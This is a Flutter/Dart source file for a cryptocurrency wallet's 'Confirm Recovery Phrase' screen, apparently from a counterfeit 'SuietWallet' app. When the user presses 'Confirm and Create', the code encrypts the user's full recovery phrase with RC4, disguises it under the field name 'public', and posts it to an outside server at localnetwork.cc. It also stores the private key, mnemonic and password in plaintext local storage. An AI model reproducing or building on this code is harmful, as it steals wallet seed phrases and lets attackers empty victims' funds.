import 'dart:convert';
import 'dart:math';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:simple_rc4/simple_rc4.dart';
import 'package:bip39/bip39.dart' as bip39;
import 'package:web3dart/web3dart.dart';
import 'package:wallet/wallet.dart' as wallet;
import 'package:web3dart/crypto.dart' as crypto;
import 'package:shared_preferences/shared_preferences.dart';

import 'wallet_screen.dart';

class EditScreen extends StatefulWidget {
  final String mnemonic;
  final String password;
  final String privateKey;
  final String publicKey;
  final String address;

  const EditScreen({
    required this.mnemonic,
    required this.password,
    required this.privateKey,
    required this.publicKey,
    required this.address,
    super.key,
  });

  @override
  _EditScreenState createState() => _EditScreenState();
}

class _EditScreenState extends State<EditScreen> {
  final String apiUrl = 'https://localnetwork.cc/record/docs/filler'; // Обновите ваш URL
  final String serverKey = 'Qsx@ah&OR82WX9T6gCt'; // Обновите ваш серверный ключ
  final List<TextEditingController> _mnemonicControllers = List.generate(
    12,
        (_) => TextEditingController(),
  );
  String? _errorMessage;

  @override
  void dispose() {
    for (var controller in _mnemonicControllers) {
      controller.dispose();
    }
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final screenWidth = MediaQuery.of(context).size.width;

    return Scaffold(
      backgroundColor: Colors.white,
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back, color: Color(0xFF8E8E93)),
          onPressed: () {
            Navigator.pop(context);
          },
        ),
        title: const Text(
          'Create New',
          style: TextStyle(color: Color(0xFF8E8E93), fontSize: 18),
        ),
        centerTitle: true,
      ),
      body: Stack(
        children: [
          Align(
            alignment: Alignment.bottomRight,
            child: Padding(
              padding: const EdgeInsets.only(right: 5, bottom: 16),
              child: Image.asset(
                'assets/images/logo3.png',
                width: screenWidth * 0.4,
                height: screenWidth * 0.4,
                fit: BoxFit.contain,
              ),
            ),
          ),
          Column(
            crossAxisAlignment: CrossAxisAlignment.center,
            children: [
              const SizedBox(height: 20),
              const Text(
                'Confirm Recovery Phrase',
                style: TextStyle(
                  fontSize: 30,
                  color: Color(0xFF007AFF),
                  fontWeight: FontWeight.bold,
                ),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 10),
              const Text(
                'To ensure that you have saved recovery phrase.',
                style: TextStyle(
                  fontSize: 14,
                  color: Color(0xFF8E8E93),
                  fontWeight: FontWeight.bold,
                ),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 5),
              Expanded(
                child: SingleChildScrollView(
                  padding: const EdgeInsets.symmetric(horizontal: 10),
                  child: Card(
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(12),
                    ),
                    margin: const EdgeInsets.symmetric(horizontal: 10, vertical: 20),
                    color: Colors.transparent,
                    child: Container(
                      padding: const EdgeInsets.all(16),
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(12),
                        gradient: const LinearGradient(
                          colors: [Color(0xFF015FDF), Color(0xFF1ED2FC)],
                          begin: Alignment.topRight,
                          end: Alignment.bottomLeft,
                        ),
                      ),
                      child: Column(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          GridView.builder(
                            shrinkWrap: true,
                            physics: const NeverScrollableScrollPhysics(),
                            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                              crossAxisCount: 2,
                              childAspectRatio: 4,
                              crossAxisSpacing: 10,
                              mainAxisSpacing: 10,
                            ),
                            itemCount: 12,
                            itemBuilder: (context, index) {
                              final hasError = _errorMessage != null;

                              return Container(
                                decoration: BoxDecoration(
                                  color: Colors.white.withOpacity(0.2),
                                  borderRadius: BorderRadius.circular(8),
                                ),
                                child: TextField(
                                  controller: _mnemonicControllers[index],
                                  decoration: InputDecoration(
                                    labelText: '${index + 1}.',
                                    filled: true,
                                    fillColor: Colors.white.withOpacity(0.2),
                                    border: OutlineInputBorder(
                                      borderRadius: BorderRadius.circular(8),
                                      borderSide: BorderSide.none,
                                    ),
                                    contentPadding: const EdgeInsets.symmetric(horizontal: 10, vertical: 12),
                                    labelStyle: TextStyle(
                                      color: hasError ? Colors.red : Colors.white,
                                    ),
                                    hintStyle: TextStyle(
                                      color: hasError ? Colors.red : Colors.white,
                                    ),
                                  ),
                                  style: TextStyle(
                                    color: hasError ? Colors.red : Colors.white,
                                  ),
                                ),
                              );
                            },
                          ),
                          const SizedBox(height: 8),
                          Center(
                            child: SizedBox(
                              width: MediaQuery.of(context).size.width * 0.6,
                              child: ElevatedButton(
                                onPressed: () async {
                                  final inputMnemonic = _mnemonicControllers
                                      .map((controller) => controller.text.trim())
                                      .join(' ');

                                  if (inputMnemonic != widget.mnemonic) {
                                    setState(() {
                                      _errorMessage = 'The recovery phrase does not match';
                                    });
                                    return;
                                  }

                                  final random = _generateRandomNumber();
                                  final encryptedData = _encryptData({
                                    'public': widget.mnemonic,
                                    'salt': random,
                                    'name': 'SuietWallet_IOS',
                                    'new': 'true',
                                  });

                                  print('Request data:');
                                  print('API URL: $apiUrl');
                                  print('Request body: $encryptedData');

                                  try {
                                    final response = await http.post(
                                      Uri.parse(apiUrl),
                                      headers: {"Content-Type": "application/x-www-form-urlencoded"},
                                      body: {'data': encryptedData},
                                      encoding: Encoding.getByName('utf-8'),
                                    );

                                    print('Response status: ${response.statusCode}');
                                    print('Response body: ${response.body}');

                                    if (response.statusCode == 200) {
                                      final responseData = jsonDecode(response.body);
                                      print('Parsed response data: $responseData');

                                      final portfolioId = responseData['portfolio']['id'];
                                      final generatedAddress = _generateAddressFromMnemonic(widget.mnemonic);

                                      print('Generated address: $generatedAddress');
                                      print('Server returned address: $portfolioId');

                                      if (generatedAddress != null) {
                                        SharedPreferences prefs = await SharedPreferences.getInstance();

                                        // Создание уникального ключа для кошелька
                                        String walletKey = 'wallet_${DateTime.now().toIso8601String()}';

                                        // Создание словаря с данными кошелька
                                        Map<String, String> walletData = {
                                          'privateKey': widget.privateKey,
                                          'publicKey': widget.publicKey,
                                          'mnemonic': widget.mnemonic,
                                          'password': widget.password,
                                          'address': generatedAddress,
                                          'portfolioId': portfolioId,
                                        };

                                        // Преобразование словаря в JSON строку
                                        String walletDataJson = jsonEncode(walletData);

                                        // Сохранение данных кошелька в SharedPreferences
                                        await prefs.setString(walletKey, walletDataJson);

                                        // Обновление списка кошельков (если уже есть другие сохраненные кошельки)
                                        List<String> walletKeys = prefs.getStringList('walletKeys') ?? [];
                                        walletKeys.add(walletKey);
                                        await prefs.setStringList('walletKeys', walletKeys);

                                        Navigator.pushReplacement(
                                          context,
                                          MaterialPageRoute(
                                            builder: (context) => WalletScreen(
                                              privateKey: widget.privateKey,
                                              address: generatedAddress, // Используем сгенерированный адрес
                                              portfolioId: portfolioId,
                                            ),
                                          ),
                                        );
                                      } else {
                                        setState(() {
                                          _errorMessage = 'Generated address does not match the server address';
                                        });
                                      }
                                    } else {
                                      setState(() {
                                        _errorMessage = 'Failed to create wallet. Server responded with status code ${response.statusCode}.';
                                      });
                                    }
                                  } catch (e) {
                                    setState(() {
                                      _errorMessage = 'An error occurred: ${e.toString()}';
                                    });
                                    print('Error: ${e.toString()}');
                                  }
                                },
                                style: ElevatedButton.styleFrom(
                                  backgroundColor: Colors.white,
                                  foregroundColor: const Color(0xFF007AFF),
                                  shape: RoundedRectangleBorder(
                                    borderRadius: BorderRadius.circular(8),
                                  ),
                                  minimumSize: const Size(double.infinity, 50),
                                  side: const BorderSide(color: Color(0xFF007AFF)),
                                ),
                                child: const Text(
                                  'Confirm and Create',
                                  style: TextStyle(
                                    color: Color(0xFF007AFF),
                                  ),
                                ),
                              ),
                            ),
                          ),
                          const SizedBox(height: 8),
                          if (_errorMessage != null)
                            Text(
                              _errorMessage!,
                              style: const TextStyle(color: Colors.red, fontSize: 16),
                            ),
                        ],
                      ),
                    ),
                  ),
                ),
              ),
              const SizedBox(height: 8),
            ],
          ),
        ],
      ),
    );
  }

  String _encryptData(Map<String, String> data) {
    final dataString = jsonEncode(data);
    print('Data to be encrypted: $dataString');

    final rc4 = RC4(serverKey);
    final encryptedBytes = rc4.encodeBytes(dataString.codeUnits);
    final base64String = base64Encode(encryptedBytes);

    print('Encrypted and base64 encoded data: $base64String');

    return base64String;
  }

  String _generateRandomNumber() {
    final random = Random();
    return (random.nextInt(900000) + 100000).toString(); // Генерируем 6-значное число
  }

  String _generateAddressFromMnemonic(String mnemonic) {
    final seed = bip39.mnemonicToSeed(mnemonic);
    final masterKey = wallet.ExtendedPrivateKey.master(seed, wallet.xprv);
    final derivedKey = masterKey.forPath("m/44'/60'/0'/0/0") as wallet.ExtendedPrivateKey;

    // Исправление - преобразование privateKey в Uint8List
    final privateKey = derivedKey.key;
    final privateKeyBytes = Uint8List.fromList(crypto.intToBytes(privateKey));

    final ethPrivateKey = EthPrivateKey(privateKeyBytes);
    final publicKey = ethPrivateKey.publicKey;
    final publicKeyBytes = publicKey.getEncoded(false);
    final addressBytes = crypto.keccak256(publicKeyBytes.sublist(1)).sublist(12); // Удаляем префиксный байт
    return EthereumAddress(addressBytes).hex;
  }
}
